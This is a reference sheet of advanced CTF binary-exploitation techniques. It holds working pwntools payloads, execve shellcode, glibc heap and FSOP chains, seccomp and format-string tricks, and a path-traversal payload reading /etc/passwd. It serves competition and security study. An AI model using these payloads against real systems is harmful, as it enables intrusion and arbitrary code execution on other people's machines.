# CTF Pwn - Advanced Techniques

## Table of Contents
- [Seccomp Advanced Techniques](#seccomp-advanced-techniques)
  - [openat2 Bypass (New Age Pattern)](#openat2-bypass-new-age-pattern)
  - [Conditional Buffer Address Restrictions](#conditional-buffer-address-restrictions)
  - [Shellcode Construction Without Relocations (pwntools)](#shellcode-construction-without-relocations-pwntools)
  - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
- [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2-fsop-for-glibc-234-0xfun-2026)
- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar-off-by-one-null-byte-0xfun-2026)
- [VM Signed Comparison Bug (0xFun 2026)](#vm-signed-comparison-bug-0xfun-2026)
- [BF JIT Unbalanced Bracket → RWX Shellcode (VuwCTF 2025)](#bf-jit-unbalanced-bracket-rwx-shellcode-vuwctf-2025)
- [Type Confusion in Interpreter (VuwCTF 2025)](#type-confusion-in-interpreter-vuwctf-2025)
- [Off-by-One Index → Size Corruption (VuwCTF 2025)](#off-by-one-index-size-corruption-vuwctf-2025)
- [Double win() Call Pattern (VuwCTF 2025)](#double-win-call-pattern-vuwctf-2025)
- [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
- [Heap Exploitation](#heap-exploitation)
- [Custom Allocator Exploitation](#custom-allocator-exploitation)
- [JIT Compilation Exploits](#jit-compilation-exploits)
- [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
- [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
- [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
- [DNS Record Buffer Overflow](#dns-record-buffer-overflow)
- [ASAN Shadow Memory Exploitation](#asan-shadow-memory-exploitation)
- [Format String with Encoding Constraints + RWX .fini_array Hijack](#format-string-with-encoding-constraints-rwx-fini_array-hijack)
- [Custom Canary Preservation](#custom-canary-preservation)
- [Signed Integer Bypass (Negative Quantity)](#signed-integer-bypass-negative-quantity)
- [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
- [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
- [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
- [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
- [Kernel Exploitation](#kernel-exploitation)

---

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

See [rop-and-shellcode.md](rop-and-shellcode.md#rdx-control-in-rop-chains) for full details and code examples.

---

## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

---

## House of Einherjar — Off-by-One Null Byte (0xFun 2026)

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## VM Signed Comparison Bug (0xFun 2026)

**Pattern (CHAOS ENGINE):** Custom VM STORE opcode checks `offset <= 0xfff` with signed `jle` but no lower bound check.

**Exploit:**
1. Negative offsets reach function pointer table below data area
2. Build values byte-by-byte in VM memory using VM arithmetic
3. LOAD as qwords, compute negative offsets via XOR with 0xFF..FF
4. Overwrite HALT handler with `system@plt`
5. Trigger HALT with "sh" string pointer as argument

**General lesson:** Signed vs unsigned comparison bugs in custom VMs are common. Always check bounds in both directions. Function pointer tables near data buffers = easy RCE.

---

## BF JIT Unbalanced Bracket → RWX Shellcode (VuwCTF 2025)

**Pattern (Blazingly Fast Memory Unsafe):** BF JIT compiler uses stack for `[`/`]` control flow. Unbalanced `]` pops values from prologue.

**Vulnerability:** `]` (LOOP_END) pops return address from stack. Without matching `[`, it pops the **tape address** which resides in **RWX memory**.

**Exploit:**
```python
# Stage 1: Write shellcode to tape via BF +/- operations, then trigger ]
# Use - for bytes >127 (0xff = 1 decrement vs 255 increments)
stage1 = b''
# Build read(0, tape, 256) shellcode on tape
shellcode_bytes = asm(shellcraft.read(0, 'r14', 256))
for byte in shellcode_bytes:
    if byte <= 127:
        stage1 += b'+' * byte + b'>'
    else:
        stage1 += b'-' * (256 - byte) + b'>'
stage1 += b']'  # Unbalanced ] jumps to tape (RWX)

# Stage 2: Send full execve("/bin/sh") shellcode via stdin after Stage 1 runs
```

**Identification:** JIT compilers using stack for bracket matching + RWX tape memory.

---

## Type Confusion in Interpreter (VuwCTF 2025)

**Pattern (Idempotence):** Lambda calculus interpreter's `simplify_normal_order()` unconditionally sets function type to ABS (abstraction), even when it's a VAR (variable).

**Key insight:** VAR's unused bytes 16-23 get interpreted as body pointer. When `print_expression()` encounters type > 2, it dumps raw bytes as UNKNOWN_DATA — flag bytes interpreted as type value trigger the dump.

**General lesson:** Type confusion in interpreters occurs when type tags aren't validated before downcasting. Unused padding bytes in one variant become active fields in another.

---

## Off-by-One Index → Size Corruption (VuwCTF 2025)

**Pattern (Kiwiphone):** Index 0 writes to `entries[-1]`, overlapping a struct's `size` field.

**Exploit chain:**
1. Write to index 0 with crafted data to set `phonebook.size = 48` (normally 16)
2. `print_all` now dumps 48 entries, leaking stack canary, saved RBP, and libc return address
3. Calculate libc base from leaked return address
4. Write ROP chain into entries 17-22: `[canary] [rbp] [ret] [pop_rdi] [/bin/sh] [system]`
5. Exit with -1 to trigger return through ROP chain

**Format trick:** Phone format `+48 0 0-0` doubles as valid phone number AND size overwrite value.

---

## Double win() Call Pattern (VuwCTF 2025)

**Pattern (Tōkaidō):** `win()` has `if (attempts++ > 0)` check — first call increments from 0 (fails), second call succeeds.

**Payload:** Stack two return addresses: `b'A'*offset + p64(win) + p64(win)`

**PIE calculation:** When main address is leaked: `base = main_leak - main_offset; win = base + win_offset`.

---

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.

**Classic UAF flow:**
1. Create object A (allocates chunk with function pointer)
2. Leak address via inspect/view (bypass PIE)
3. Free object A (creates dangling pointer)
4. Allocate object B of **same size** (reuses freed chunk via tcache)
5. Object B data overwrites A's function pointer with `win()` address
6. Trigger A's callback -> jumps to `win()`

**Key insight:** Both structs must be the same size for tcache to reuse the chunk.

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

## DNS Record Buffer Overflow

**Pattern (Do Not Strike The Clouds):** Many AAAA records overflow stack buffer in DNS response parser.

**Exploitation:**
1. Set up DNS server returning excessive AAAA records
2. Target binary queries DNS, copies records into fixed-size stack buffer
3. Many records overflow into return address
4. Overwrite with win function address

## ASAN Shadow Memory Exploitation

**Pattern (Asan-Bazar, Nullcon 2026):** Binary compiled with AddressSanitizer has format string + OOB write vulnerabilities.

**ASAN Shadow Byte Layout:**
| Shadow Value | Meaning |
|-------------|---------|
| `0x00` | Fully accessible (8 bytes) |
| `0x01-0x07` | Partially accessible (1-7 bytes) |
| `0xF1` | Stack left redzone |
| `0xF3` | Stack right redzone |
| `0xF5` | Stack use after return |

**Key Insight:** ASAN may use a "fake stack" (50% chance) — areas past the ASAN frame have shadow `0x00` on the real stack but different on the fake stack. Detect which by leaking the return address offset.

**Exploitation Pattern:**
```python
# 1. Leak PIE base via format string
payload = b'%8$p'  # Code pointer at known offset
pie_base = leaked - known_offset

# 2. Detect real vs fake stack
# Real stack: return address at known offset from format string buffer
# Check if leaked return address matches expected function offset
is_real_stack = (ret_addr - pie_base) == 0xdc052  # known offset

# 3. Calculate OOB write offset
# Format string buffer at stack offset N
# Target (return address) at stack offset M
# Distance in bytes = (M - N) * 8
# Map to ledger system: slot = distance // 16, sub_offset = distance % 16

# 4. Overwrite return address with win() via OOB ledger write
# Retry until real stack is used (~50% success rate per attempt)
```

**Single-Interaction Exploitation:** Combine leak + detect + exploit in one format string interaction. If fake stack detected, disconnect and retry.

## Format String with Encoding Constraints + RWX .fini_array Hijack

**Pattern (Encodinator, Nullcon 2026):** Input is base85-encoded into RWX memory at fixed address, then passed to `printf()`.

**Key insight:** Don't try libc-based exploitation. Instead, exploit the RWX mmap region directly:

1. **RWX region at fixed address** (e.g., `0x40000000`): Write shellcode here
2. **`.fini_array` hijack**: Overwrite `.fini_array[0]` to point to shellcode. When `main()` returns, `__libc_csu_fini` calls `fini_array` entries.
3. **Format string writes**: Use `%hn` to write 2 bytes at a time to `.fini_array`

**Argument numbering with base85:**
Base85 decoding changes payload length. The decoded prefix occupies P bytes on stack, so first appended pointer is at arg `6 + P/8`. Use convergence loop:

```python
arg_base = 20  # Initial guess
for _ in range(20):
    fmt = construct_format_string(writes, arg_base)
    # Pad to base85 group boundary (multiple of 5 encoded = 4 raw)
    while len(fmt) % 10 != 0:
        fmt += b"A"
    prefix = b85_decode(fmt)
    new_arg_base = 6 + (len(prefix) // 8)
    if new_arg_base == arg_base:
        break
    arg_base = new_arg_base
```

**Shellcode (19-byte execve):**
```nasm
push 0x3b          ; syscall number
pop rax
cdq                ; rdx = 0
movabs rbx, 0x68732f2f6e69622f  ; "/bin//sh"
push rdx           ; null terminator
push rbx           ; "/bin//sh"
push rsp
pop rdi            ; rdi = pointer to "/bin//sh"
push rdx
pop rsi            ; rsi = NULL
syscall
```

**Why avoid libc:** Base85 encoding makes precise libc address calculations extremely difficult. The RWX region + .fini_array approach uses only fixed addresses (no ASLR, no PIE concerns for the write target).

## Custom Canary Preservation

**Pattern (Canary In The Bitcoin Mine):** Buffer overflow must preserve known canary value.

**Key technique:** Write the exact canary bytes at the correct offset during overflow:
```python
# Buffer: 64 bytes | Canary: "BIRD" (4 bytes) | Target: 1 byte
payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
```

**Identification:** Source code shows struct with buffer + canary + flag bool, `gets()` for input.

---

## Signed Integer Bypass (Negative Quantity)

**Pattern (PascalCTF 2026):** Menu program with `scanf("%d")` for quantity. Negative input makes `quantity * price` negative, bypassing `balance >= total_cost` check.

```python
# Select expensive item (e.g., flag drink costing 1B), enter quantity -1
# -1 * 1000000000 = -1000000000 → balance (100) >= -1000000000 ✓
p.sendline(b'10')  # flag item
p.sendline(b'-1')  # negative quantity
```

## Canary-Aware Partial Overflow

**Pattern (MyGit, PascalCTF 2026):** Buffer overflow where `valid` flag sits between buffer end and canary.

**Stack layout:**
- Buffer: `rbp-0x30` (48 bytes)
- Valid flag: `rbp-0x10` (offset 32 from buffer)
- Stack canary: `rbp-0x08` (offset 40 from buffer)

**Key technique:** Use `./` as no-op path padding to control input length precisely:
```
././././././././././../../../../flag    (36 bytes)
```
- `./` segments normalize to current directory (no-op)
- Byte 32 must be non-zero to set `valid = true`
- Stay under byte 40 to avoid canary

**Exploit chain:**
1. `checkout ././././././././././../../../../flag` - reads `/flag` content as "current commit"
2. `branch create ././././././././././../../../../tmp/leaked` - writes commit (flag) to `/tmp/leaked`
3. `cat /tmp/leaked` - read the exfiltrated flag

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Adjacent global variables exploitable via overflow.

**Exploitation:**
1. Identify global array adjacent to filename pointer in memory
2. Overflow array bounds by injecting extra delimiters (commas in CSV)
3. Overflowed pointer lands on filename variable
4. Change filename to `flag.txt`, then trigger read operation

```python
# Edit last cell with comma-separated overflow
edit_cell("J10", "whatever,flag.txt")
save()   # CSV row now has 11 columns
load()   # Column 11 overwrites savefile pointer with ptr to "flag.txt"
load()   # Now reads flag.txt into spreadsheet
print_spreadsheet()  # Shows flag
```

## MD5 Preimage Gadget Construction

**Pattern (Hashchain, Nullcon 2026):** Server concatenates N MD5 digests and executes them as code. Brute-force preimages with desired byte prefixes.

**Core technique:** Each MD5 digest is 16 bytes. Use `eb 0c` (jmp +12) as first 2 bytes to skip the middle 12 bytes, landing on bytes 14-15 which become a 2-byte instruction:

```c
// Brute-force MD5 preimage with prefix eb0c and desired 2-byte suffix
for (uint64_t ctr = 0; ; ctr++) {
    sprintf(msg + prefix_len, "%016llx", ctr);
    MD5(msg, msg_len, digest);
    if (digest[0] == 0xEB && digest[1] == 0x0C) {
        uint16_t suffix = (digest[14] << 8) | digest[15];
        if (suffix == target_instruction)
            break;  // Found!
    }
}
```

**Building i386 syscall chains from 2-byte gadgets:**
- `31c0` = `xor eax, eax`
- `89e1` = `mov ecx, esp`
- `b220` = `mov dl, 0x20`
- `cd80` = `int 0x80`
- `40` + NOP = `inc eax`

**Hashchain v1 (JMP to NOP sled):** RWX buffer at `0x40000000` + NOP sled at `0x41000000`. Find MD5 preimage starting with `0xE9` (jmp rel32) that lands in the sled:
```python
# Brute-force: find input whose MD5 starts with E9 and offset lands in NOP sled
# Example: b"v" + b"G" * 86 → MD5 starts with e9 59 1f 2c → jmp 0x412c1f5e
```

**Hashchain v2 (3-hash chain):** Store MD5 digests at user-controlled offsets. Build instruction chain:
- **Offset 0 (jmp +2):** Find input whose MD5 starts with `EB 02` (e.g., `143874`)
- **Offset 4 (push win):** Find input whose MD5 starts with `68 XX XX XX` matching win() address bytes
- **Offset 8 (ret):** Find input whose MD5 byte[1] is `C3` (e.g., `5488` → `56 C3`)

**Pre-computation approach:** Build lookup table mapping MD5 4-byte prefixes to inputs. At runtime, parse win() address from server banner, look up matching push-hash input.

**Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.

## Path Traversal Sanitizer Bypass

**Pattern (Galactic Archives):** Sanitizer skips character after finding banned char.

```python
# Sanitizer removes '.' and '/' but skips next char after match
# ../../etc/passwd -> bypass with doubled chars:
"....//....//etc//passwd"
# Each '..' becomes '....' (first '.' caught, second skipped, third caught, fourth survives)
```

**Flag via `/proc/self/fd/N`:**
- If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
- fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file

## Kernel Exploitation

- Look for vulnerable `lseek` handlers allowing OOB read/write
- Heap grooming with forked processes
- SUID binary exploitation via kernel-to-userland buffer overflow
- Check kernel config for disabled protections:
  - `CONFIG_SLAB_FREELIST_RANDOM=n` -> sequential heap chunks
  - `CONFIG_SLAB_MERGE_DEFAULT=n` -> predictable allocations

---

See [rop-and-shellcode.md](rop-and-shellcode.md) for `.fini_array` hijack details.

See [sandbox-escape.md](sandbox-escape.md) for shell tricks and restricted environment techniques.
